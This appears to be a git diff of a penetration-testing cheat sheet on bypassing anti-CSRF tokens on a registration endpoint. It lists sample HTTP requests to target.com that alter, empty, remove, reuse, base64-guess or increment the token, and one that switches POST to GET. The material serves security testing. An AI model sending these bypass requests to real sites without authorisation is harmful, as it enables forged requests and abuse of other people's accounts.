@@ -4,7 +4,7 @@
 ```
 POST /register HTTP/1.1
 Host: target.com
-[...]
+...
 
 username=dapos&password=123456&token=aaaaaaaaaaaaaaaaaaaaaa
 ```
@@ -12,7 +12,7 @@ Try this to bypass
 ```
 POST /register HTTP/1.1
 Host: target.com
-[...]
+...
 
 username=dapos&password=123456&token=aaaaaaaaaaaaaaaaaaaaab
 ```
@@ -21,7 +21,7 @@ username=dapos&password=123456&token=aaaaaaaaaaaaaaaaaaaaab
 ```
 POST /register HTTP/1.1
 Host: target.com
-[...]
+...
 
 username=dapos&password=123456&token=aaaaaaaaaaaaaaaaaaaaaa
 ```
@@ -29,7 +29,7 @@ Try this to bypass
 ```
 POST /register HTTP/1.1
 Host: target.com
-[...]
+...
 
 username=dapos&password=123456&token=
 ```
@@ -38,7 +38,7 @@ username=dapos&password=123456&token=
 ```
 POST /register HTTP/1.1
 Host: target.com
-[...]
+...
 
 username=dapos&password=123456&token=aaaaaa
 ```
@@ -46,7 +46,7 @@ Try this to bypass
 ```
 POST /register HTTP/1.1
 Host: target.com
-[...]
+...
 
 username=dapos&password=123456&token=aaabaa
 ```
@@ -54,7 +54,7 @@ username=dapos&password=123456&token=aaabaa
 ```
 POST /register HTTP/1.1
 Host: target.com
-[...]
+...
 
 username=dapos&password=123456&token=aaaaaaaaaaaaaaaaaaaaaa
 ```
@@ -62,14 +62,14 @@ Try this to bypass
 ```
 GET /register?username=dapos&password=123456&token=aaaaaaaaaaaaaaaaaaaaaa HTTP/1.1
 Host: target.com
-[...]
+...
 ```
 
 5. Remove the token from request
 ```
 POST /register HTTP/1.1
 Host: target.com
-[...]
+...
 
 username=dapos&password=123456&token=aaaaaaaaaaaaaaaaaaaaaa
 ```
@@ -77,7 +77,7 @@ Try this to bypass
 ```
 POST /register HTTP/1.1
 Host: target.com
-[...]
+...
 
 username=dapos&password=123456
 ```
@@ -86,7 +86,7 @@ username=dapos&password=123456
 ```
 POST /register HTTP/1.1
 Host: target.com
-[...]
+...
 
 username=dapos&password=123456&token=ANOTHER_VALID_TOKEN
 ```
@@ -95,7 +95,7 @@ username=dapos&password=123456&token=ANOTHER_VALID_TOKEN
 ```
 POST /register HTTP/1.1
 Host: target.com
-[...]
+...
 
 username=dapos&password=123456&token=MTIzNDU2
 ```
@@ -105,7 +105,7 @@ MTIzNDU2 => 123456 with base64
 ```
 POST /register HTTP/1.1
 Host: target.com
-[...]
+...
 
 username=dapos&password=123456&token=vi802jg9f8akd9j123
 ```
@@ -113,7 +113,7 @@ When we register again, the request like this
 ```
 POST /register HTTP/1.1
 Host: target.com
-[...]
+...
 
 username=dapos&password=123456&token=vi802jg9f8akd9j124
 ```
